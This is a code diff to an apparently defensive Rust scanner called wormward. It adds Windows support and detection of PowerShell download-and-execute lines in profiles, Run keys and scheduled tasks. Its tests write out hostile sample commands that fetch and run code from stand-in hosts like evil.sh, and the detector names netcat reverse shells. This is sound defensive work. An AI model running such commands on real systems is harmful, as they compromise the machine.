@@ -171,7 +171,7 @@ pub fn list_processes() -> Vec<(u32, String)> {
 pub fn list_processes() -> Vec<(u32, String)> {
     let script =
         "Get-CimInstance Win32_Process | ForEach-Object { \"$($_.ProcessId)`t$($_.CommandLine)\" }";
-    let out = match std::process::Command::new("powershell")
+    let out = match wormward_core::proc::command("powershell")
         .args(["-NoProfile", "-NonInteractive", "-Command", script])
         .output()
     {
@@ -363,17 +363,34 @@ fn count_mcp_servers(json: &str) -> usize {
         .unwrap_or(0)
 }
 
+/// Invoke a package-manager CLI portably. On Windows, npm/pnpm are `.cmd` shims which
+/// `CreateProcess` cannot exec directly — `Command::new("npm")` fails with NotFound and every
+/// npm-backed check silently degrades to "no data". Route through `cmd /C` there so PATHEXT
+/// resolution applies (covering .cmd shims and .exe installs alike); elsewhere spawn directly.
+fn tool_command(tool: &str, args: &[&str]) -> std::process::Command {
+    #[cfg(target_os = "windows")]
+    {
+        let mut c = wormward_core::proc::command("cmd");
+        c.arg("/C").arg(tool).args(args);
+        c
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        let mut c = wormward_core::proc::command(tool);
+        c.args(args);
+        c
+    }
+}
+
 fn command_exists(bin: &str) -> bool {
-    wormward_core::proc::command(bin)
-        .arg("--version")
+    tool_command(bin, &["--version"])
         .output()
         .map(|o| o.status.success())
         .unwrap_or(false)
 }
 
 fn ignore_scripts_check(tool: &str) -> TriggerCheck {
-    let value = wormward_core::proc::command(tool)
-        .args(["config", "get", "ignore-scripts"])
+    let value = tool_command(tool, &["config", "get", "ignore-scripts"])
         .output()
         .ok()
         .filter(|o| o.status.success())
@@ -391,8 +408,19 @@ fn ignore_scripts_check(tool: &str) -> TriggerCheck {
     }
 }
 
+/// Where VS Code–family editors keep their user settings, per platform: macOS under
+/// `~/Library/Application Support`, Windows under `%APPDATA%`, Linux under `~/.config`.
+fn editor_config_base() -> PathBuf {
+    #[cfg(target_os = "macos")]
+    return home_dir().join("Library/Application Support");
+    #[cfg(target_os = "windows")]
+    return std::env::var_os("APPDATA").map(PathBuf::from).unwrap_or_default();
+    #[cfg(all(not(target_os = "macos"), not(target_os = "windows")))]
+    return home_dir().join(".config");
+}
+
 fn editor_settings_paths() -> Vec<(&'static str, PathBuf)> {
-    let base = home_dir().join("Library/Application Support");
+    let base = editor_config_base();
     vec![
         ("VS Code", base.join("Code/User/settings.json")),
         ("Cursor", base.join("Cursor/User/settings.json")),
@@ -403,7 +431,8 @@ fn mcp_config_paths() -> Vec<PathBuf> {
     let home = home_dir();
     vec![
         home.join(".cursor/mcp.json"),
-        home.join("Library/Application Support/Claude/claude_desktop_config.json"),
+        // Claude Desktop keeps its config under the same per-platform base as the editors.
+        editor_config_base().join("Claude/claude_desktop_config.json"),
         home.join(".codeium/windsurf/mcp_config.json"),
     ]
 }
@@ -457,8 +486,7 @@ pub fn fix_triggers() -> Vec<String> {
         if tool == "pnpm" && !command_exists("pnpm") {
             continue;
         }
-        let ok = wormward_core::proc::command(tool)
-            .args(["config", "set", "ignore-scripts", "true"])
+        let ok = tool_command(tool, &["config", "set", "ignore-scripts", "true"])
             .status()
             .map(|s| s.success())
             .unwrap_or(false);
@@ -471,7 +499,17 @@ pub fn fix_triggers() -> Vec<String> {
 
 // ---- prevention (harden) ----
 
-/// The `/etc/hosts` C2-sinkhole block for the given C2 domains, delimited so it can be removed
+/// The platform's hosts file — the target for the C2-sinkhole block below. Guidance-only (the
+/// caller prints it; wormward never writes a system file itself).
+pub fn hosts_file_path() -> &'static str {
+    if cfg!(target_os = "windows") {
+        r"C:\Windows\System32\drivers\etc\hosts"
+    } else {
+        "/etc/hosts"
+    }
+}
+
+/// The hosts-file C2-sinkhole block for the given C2 domains, delimited so it can be removed
 /// exactly on unharden. Pure/testable. Points each C2 domain at 0.0.0.0.
 pub fn hosts_sinkhole_block(domains: &[String]) -> String {
     let mut s = String::from("# >>> wormward C2 sinkhole >>>\n");
@@ -575,6 +613,25 @@ pub fn suspicious_shell_line(line: &str) -> Option<String> {
     }
     if l.contains("nc -e") {
         return Some("netcat reverse shell".into());
+    }
+    // PowerShell download-and-exec (profiles, Run keys, scheduled tasks). PS is case-
+    // insensitive, so match on a lowercased copy; TOKEN membership (not substring) for the
+    // short aliases, so `iexplore.exe` never satisfies `iex` and `irmscan.dll` never `irm`.
+    let low = l.to_lowercase();
+    let has_tok = |t: &str| {
+        low.split(|c: char| !(c.is_ascii_alphanumeric() || c == '-')).any(|tok| tok == t)
+    };
+    let ps_fetch = has_fetch
+        || has_tok("iwr")
+        || has_tok("irm")
+        || has_tok("invoke-webrequest")
+        || has_tok("invoke-restmethod");
+    let ps_eval = has_tok("iex") || has_tok("invoke-expression");
+    if ps_fetch && ps_eval {
+        return Some("fetch fed to Invoke-Expression".into());
+    }
+    if low.contains("frombase64string") && ps_eval {
+        return Some("base64-decoded code executed".into());
     }
     if polinrider_fingerprint(l).is_some() {
         return Some("loader fingerprint".into());
@@ -692,19 +749,32 @@ fn c2_hosts() -> Vec<String> {
     hosts
 }
 
-/// Read the shell-rc files that a login shell sources, as `(path, content)` pairs.
+/// Read the shell-rc files that a login shell sources, as `(path, content)` pairs. On Windows
+/// the equivalent startup-injection surface is the PowerShell profile (both the Windows
+/// PowerShell 5 and PowerShell 7 locations, plus the OneDrive-redirected Documents variant).
 fn shell_rc_files() -> Vec<(PathBuf, String)> {
     let home = home_dir();
-    [".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"]
-        .iter()
-        .filter_map(|f| {
-            let p = home.join(f);
-            std::fs::read_to_string(&p).ok().map(|c| (p, c))
-        })
+    let mut paths: Vec<PathBuf> =
+        [".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"]
+            .iter()
+            .map(|f| home.join(f))
+            .collect();
+    #[cfg(target_os = "windows")]
+    for docs in ["Documents", "OneDrive/Documents"] {
+        for shell in ["WindowsPowerShell", "PowerShell"] {
+            paths.push(home.join(docs).join(shell).join("Microsoft.PowerShell_profile.ps1"));
+            paths.push(home.join(docs).join(shell).join("profile.ps1"));
+        }
+    }
+    paths
+        .into_iter()
+        .filter_map(|p| std::fs::read_to_string(&p).ok().map(|c| (p, c)))
         .collect()
 }
 
-/// Read launchd plists + crontab as `(path, content)` pairs.
+/// Read persistence entries as `(path, content)` pairs: launchd plists + crontab on Unix;
+/// registry Run keys, the Startup folder's text scripts, and the scheduled-task list on Windows.
+#[cfg(not(target_os = "windows"))]
 fn persistence_items() -> Vec<(PathBuf, String)> {
     let home = home_dir();
     let mut items = Vec::new();
@@ -733,12 +803,70 @@ fn persistence_items() -> Vec<(PathBuf, String)> {
     items
 }
 
-/// Live established TCP connections (one line per connection) via `lsof`.
+#[cfg(target_os = "windows")]
+fn persistence_items() -> Vec<(PathBuf, String)> {
+    let mut items = Vec::new();
+    // Registry Run keys: each value's command line runs at logon. `reg query` output lines carry
+    // the full command, so the same suspicious-line check applies.
+    for hive in ["HKCU", "HKLM"] {
+        let key = format!(r"{hive}\Software\Microsoft\Windows\CurrentVersion\Run");
+        if let Ok(o) = wormward_core::proc::command("reg").args(["query", &key]).output() {
+            if o.status.success() {
+                items.push((PathBuf::from(&key), String::from_utf8_lossy(&o.stdout).into_owned()));
+            }
+        }
+    }
+    // Startup folder: any script dropped here runs at logon. Text scripts only — .lnk is binary
+    // (its target would need a shell-link parser; the Run keys and schtasks cover command lines).
+    if let Some(appdata) = std::env::var_os("APPDATA") {
+        let startup =
+            PathBuf::from(appdata).join("Microsoft/Windows/Start Menu/Programs/Startup");
+        if let Ok(entries) = std::fs::read_dir(&startup) {
+            for e in entries.flatten() {
+                let p = e.path();
+                let ext = p.extension().and_then(|x| x.to_str()).unwrap_or_default();
+                if ["bat", "cmd", "vbs", "js", "ps1"].contains(&ext.to_ascii_lowercase().as_str()) {
+                    if let Ok(c) = std::fs::read_to_string(&p) {
+                        items.push((p, c));
+                    }
+                }
+            }
+        }
+    }
+    // Scheduled tasks: the verbose list includes each task's "Task To Run" command line.
+    if let Ok(o) =
+        wormward_core::proc::command("schtasks").args(["/query", "/fo", "LIST", "/v"]).output()
+    {
+        if o.status.success() {
+            items.push((
+                PathBuf::from("schtasks"),
+                String::from_utf8_lossy(&o.stdout).into_owned(),
+            ));
+        }
+    }
+    items
+}
+
+/// Live established TCP connections (one line per connection): `lsof` on Unix, `netstat -ano`
+/// on Windows (both print the remote address inline, which is what scan_connections matches).
+#[cfg(not(target_os = "windows"))]
 fn tcp_connection_lines() -> Vec<String> {
     match wormward_core::proc::command("lsof").args(["-nP", "-iTCP", "-sTCP:ESTABLISHED"]).output() {
         Ok(o) if o.status.success() => {
             String::from_utf8_lossy(&o.stdout).lines().map(String::from).collect()
         }
+        _ => Vec::new(),
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn tcp_connection_lines() -> Vec<String> {
+    match wormward_core::proc::command("netstat").args(["-ano"]).output() {
+        Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
+            .lines()
+            .filter(|l| l.contains("ESTABLISHED"))
+            .map(String::from)
+            .collect(),
         _ => Vec::new(),
     }
 }
@@ -750,10 +878,11 @@ fn global_package_names() -> Vec<String> {
         if tool == "pnpm" && !command_exists("pnpm") {
             continue;
         }
-        if let Ok(o) =
-            wormward_core::proc::command(tool).args(["ls", "-g", "--depth=0", "--parseable"]).output()
-        {
+        if let Ok(o) = tool_command(tool, &["ls", "-g", "--depth=0", "--parseable"]).output() {
             for line in String::from_utf8_lossy(&o.stdout).lines() {
+                // Windows `npm ls --parseable` emits backslash paths; normalize so the
+                // `node_modules/` split works on both separators.
+                let line = line.replace('\\', "/");
                 if let Some(idx) = line.rfind("node_modules/") {
                     let name = &line[idx + "node_modules/".len()..];
                     if !name.is_empty() {
@@ -935,6 +1064,28 @@ mod tests {
         assert!(suspicious_shell_line("curl -O https://example.com/file.tar.gz").is_none());
         assert!(suspicious_shell_line("export EDITOR=vim").is_none());
         assert!(suspicious_shell_line("# curl x | bash").is_none());
+    }
+
+    #[test]
+    fn suspicious_powershell_lines_detected() {
+        // PowerShell download-and-exec shapes (profiles, Run keys, scheduled tasks). PS is
+        // case-insensitive, so detection must be too.
+        assert!(suspicious_shell_line("iwr https://evil.sh/x.ps1 | iex").is_some());
+        assert!(suspicious_shell_line("IEX (Invoke-WebRequest https://evil.sh).Content").is_some());
+        assert!(suspicious_shell_line("irm evil.sh/payload | iex").is_some());
+        assert!(suspicious_shell_line(
+            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
+        )
+        .is_some());
+        // Benign PowerShell must stay quiet.
+        assert!(suspicious_shell_line("Invoke-WebRequest https://example.com -OutFile x.zip").is_none());
+        assert!(suspicious_shell_line("Set-Alias g git").is_none());
+        assert!(suspicious_shell_line("# iwr https://x | iex").is_none());
+        // `iexplore.exe` must never satisfy the `iex` token (a real Run-key value shape).
+        assert!(suspicious_shell_line(
+            "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" https://update.example.com"
+        )
+        .is_none());
     }
 
     #[test]
